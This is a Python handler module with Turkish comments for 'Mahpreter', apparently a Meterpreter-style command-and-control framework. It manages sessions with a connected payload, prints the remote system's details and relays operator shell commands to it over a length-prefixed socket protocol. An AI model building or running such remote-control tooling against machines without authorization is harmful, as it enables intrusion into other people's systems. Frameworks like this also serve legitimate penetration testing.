import contextlib
import struct

from rich import print

from core.handler import BaseHandler


class Handler(BaseHandler):
    """
    Mahpreter için özel handler.
    Length-prefixed protokolü destekler.

    handle_connection stdin çalmaz; etkileşim interact() / sessions -i ile olur.
    """

    def handle_connection(self, client_sock, session_id=None):
        self.client_sock = client_sock
        self.session_id = session_id
        print(f"[*] Mahpreter oturumu hazır (Session: {session_id}).")

        try:
            sysinfo = self.recv_data()
            if sysinfo:
                print(f"[+] Sistem Bilgisi: {sysinfo}")
        except Exception as e:
            print(f"[!] Sistem bilgisi alınamadı: {e}")

        if session_id is not None:
            print(f"[*] Etkileşim için: sessions -i {session_id}")

        # Peer (payload) ölünce döner → _handle_client_thread session'ı siler
        self.keep_connection_alive(client_sock)

    def interact(self, session_id: int):
        sock = self.resolve_client_sock(session_id)
        if sock:
            self.client_sock = sock
        if not self.client_sock:
            print(f"[!] Session {session_id}: aktif soket yok.")
            return
        if self.peer_connection_closed(self.client_sock):
            print(f"[!] Session {session_id}: bağlantı kopmuş.")
            self._mark_socket_dead(self.client_sock)
            return
        self.session_id = session_id
        self.interactive_session()

    def send_data(self, data: str):
        if not self.client_sock:
            return
        encoded = data.encode("utf-8")
        length = struct.pack("!I", len(encoded))
        self.client_sock.sendall(length + encoded)

    def recv_data(self) -> str:
        if not self.client_sock:
            return ""
        len_data = self.client_sock.recv(4)
        if not len_data:
            return ""
        length = struct.unpack("!I", len_data)[0]

        data = b""
        while len(data) < length:
            chunk = self.client_sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        return data.decode("utf-8")

    def _mark_socket_dead(self, sock) -> None:
        """Soketi kapatır; keep_connection_alive çıkar ve session temizlenir."""
        with contextlib.suppress(OSError, AttributeError):
            sock.shutdown(2)
        with contextlib.suppress(OSError, AttributeError):
            sock.close()

    def interactive_session(self):
        print("-" * 50)
        print("[*] Komut satırı aktif. Çıkmak için 'exit', 'background' veya CTRL+C.")
        print("-" * 50)

        while True:
            try:
                cmd = input("mahpreter > ")
                if not cmd.strip():
                    continue

                if cmd in ("exit", "quit", "terminate"):
                    print("[*] Oturum kapatılıyor...")
                    if cmd == "terminate":
                        self.send_data("terminate")
                        self._mark_socket_dead(self.client_sock)
                    break

                if cmd in ("background", "bg"):
                    print("[*] Oturum arka plana atıldı.")
                    break

                self.send_data(cmd)

                response = self.recv_data()
                if response:
                    print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    self._mark_socket_dead(self.client_sock)
                    break
            except KeyboardInterrupt:
                print("\n[*] Oturum arka plana alındı (CTRL+C).")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                self._mark_socket_dead(self.client_sock)
                break
